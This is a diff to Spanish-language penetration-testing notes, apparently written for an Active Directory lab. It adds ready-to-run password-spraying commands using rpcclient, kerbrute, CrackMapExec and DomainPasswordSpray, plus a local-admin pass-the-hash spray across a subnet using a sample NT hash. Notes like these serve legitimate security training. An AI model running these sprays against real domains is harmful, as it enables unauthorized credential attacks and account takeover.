@@ -64,7 +64,7 @@ Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 Con la tecla esc se puede salir de la consola y tipear HELP para que se nos muestra la ayuda con los comandos y cosas para habilitar
 
 ----------	----------	----------	----------
-	### Password spraying
+	### Password spraying: Enumerar usuarios y politicas
 Consta del intento de loguearse a un servicio mediante el uso de una contraseña pero una larga lista de usuarios
 
 Para realizar este ataque correctamente priomero se necesita:
@@ -119,6 +119,32 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 #Si bien no genere windows ID event, el uso de kerbrute generaria un evento de request de TGT en el caso de que "Kerberos event logging" este habilitado
 
 ----------  ----------  ----------  ----------
-	### Internal Password Spraying - from Linux
+	### Password Spraying from Linux
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
-#
+#One liner en bash para hacer passworrd sprying usando rpcclient y la lista obtenida de usuarios
+
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+#Password sprying con kerbrute usando lista de usr validos
+
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+#Password srpying con crackmap exec filtrado por lo valido (+) uusando lista de us validos
+
+## Verificacion de credencialees
+sudo crackmapexec smb 172.16.5.5 -u <usuario> -p <Pass encontrada>
+#Verificacion de usuarios y contraseñas validas mediante crackmapexec
+
+## Local Admin Spraying with CrackMapExec
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+#Si tenemos el hash NT de un admin de cuenta local (no dominio). Es recomendable verificar dicho hash en toda la subnet con la flag --loca-auth para que el tool solo intente logearse 1 vez en cada maquina
+#Tecnica muy ruidosa. Cuidado
+
+----------  ----------  ----------  ----------
+	### Password Spraying from Windows
+En el caso de que estemos en una maquuina windows, el uso del tool DomainPasswordSpray puede ayudarnos. https://github.com/dafthack/DomainPasswordSpray
+Si estamos autenticados, el tool genera una lista de usuarios, consulta la politica de pwd y ejecuta el Sprying sin bloquear las cuentas.
+Si no estamos autenticados, podemos pasarle una lista de usuarios como en Linux con "-UserList" flag
+
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+#Ejemplo del uso de tool estando autenticado en el dominio
+#En el caso de no estarlo, se le pasa con la flag de la explicaion (-UserList) la lista de usuarios validos
